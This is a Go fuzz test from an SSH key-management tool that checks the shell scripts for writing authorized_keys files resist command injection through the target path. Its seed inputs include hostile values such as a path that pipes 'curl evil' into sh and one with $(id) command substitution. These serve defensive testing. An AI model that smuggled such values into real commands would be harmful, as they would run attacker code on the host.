package sshwrite

import (
	"os/exec"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/sshconn"
)

// FuzzWriteCmds checks the two facts that together make shell injection
// through the target path impossible, without executing any write script
// (fuzz-executing scripts that mkdir/mv/rm at fuzz-chosen paths is not
// sandbox-safe; execution coverage for fixed hostile paths lives in
// TestWriteCmdThroughRealSh):
//
//  1. Template invariance: every builder's script starts with exactly one
//     sshconn.PathAssign(path), and the rest of the script is byte-identical
//     to the script built for a fixed reference path. The path therefore
//     enters the script nowhere else.
//  2. PathAssign evaluates to the path: run only PathAssign(path) followed by
//     printf of "$p" under /bin/sh with HOME=/h and no other environment; it
//     must print exactly path ("~/" expanded to "/h/"). A quoting escape
//     would run, split or expand the path instead of printing it.
//
// FuzzShQuote in internal/sshconn still guards ShQuote itself.
func FuzzWriteCmds(f *testing.F) {
	seeds := []string{
		"~/.ssh/authorized_keys",
		"/etc/o'brien/keys",
		"/tmp/x; curl evil|sh",
		"~/my keys/auth",
		"/tmp/$(id)/`id`",
		`/tmp/a"b`,
		"'",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	builders := map[string]func(string) string{
		"write absent":   func(p string) string { return writeCmdFor(p, Snapshot{Absent: true}, 42) },
		"write present":  func(p string) string { return writeCmdFor(p, SnapshotOf(false, []byte("x\n")), 42) },
		"restore":        func(p string) string { return restoreCmdFor(p, false, SnapshotOf(false, []byte("x\n"))) },
		"restore absent": func(p string) string { return restoreCmdFor(p, true, SnapshotOf(false, []byte("x\n"))) },
	}
	const ref = "/ref/authorized_keys"
	f.Fuzz(func(t *testing.T, path string) {
		if strings.ContainsRune(path, 0) {
			t.Skip("NUL cannot survive execve; config validation rejects control characters")
		}
		for name, build := range builders {
			got, want := build(path), build(ref)
			rest, ok := strings.CutPrefix(got, sshconn.PathAssign(path))
			if !ok {
				t.Fatalf("%s: script does not start with PathAssign(%q):\n%s", name, path, got)
			}
			if wantRest := strings.TrimPrefix(want, sshconn.PathAssign(ref)); rest != wantRest {
				t.Fatalf("%s: path %q changed the script outside its PathAssign token:\n got %s\nwant %s", name, path, rest, wantRest)
			}
		}
		expect := path
		if r, ok := strings.CutPrefix(path, "~/"); ok {
			expect = "/h/" + r
		}
		c := exec.CommandContext(t.Context(), "sh", "-c", sshconn.PathAssign(path)+`; printf %s "$p"`)
		c.Env = []string{"HOME=/h"}
		out, err := c.Output()
		if err != nil || string(out) != expect {
			t.Fatalf("PathAssign(%q) evaluates to %q (err %v), want %q", path, out, err, expect)
		}
	})
}
